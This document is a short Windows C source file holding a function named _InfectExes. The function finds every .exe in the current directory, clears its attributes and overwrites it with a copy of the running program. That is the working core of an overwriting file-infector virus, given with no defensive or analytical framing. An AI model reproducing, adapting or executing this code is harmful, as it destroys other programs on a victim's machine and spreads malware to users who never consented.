#include "data_globals.h"
#include <windows.h>
#include <stdint.h>

#pragma optimize("", off)
uint32_t _InfectExes(void)
{
    volatile struct _LocalCtx {
        uint32_t result;
        BOOL success;
        char current_exe_path[256];
        WIN32_FIND_DATAA file_data;
        HANDLE find_handle;
    } ctx;

    // Variables are not initialized at declaration; they will be assigned later.
    // No explicit assignments needed here.

    GetModuleFileNameA(NULL, ctx.current_exe_path, sizeof(ctx.current_exe_path));
    ctx.find_handle = FindFirstFileA("*.exe", &ctx.file_data);

    if (ctx.find_handle == INVALID_HANDLE_VALUE)
    {
        ctx.result = 1;
    }
    else
    {
        SetFileAttributesA(ctx.file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
        CopyFileA(ctx.current_exe_path, ctx.file_data.cFileName, FALSE);

        while (TRUE)
        {
            ctx.success = FindNextFileA(ctx.find_handle, &ctx.file_data);
            if (ctx.success == 0) break;
            SetFileAttributesA(ctx.file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
            CopyFileA(ctx.current_exe_path, ctx.file_data.cFileName, FALSE);
        }

        FindClose(ctx.find_handle);
        ctx.result = 0;
    }
    return ctx.result;
}
#pragma optimize("", on)
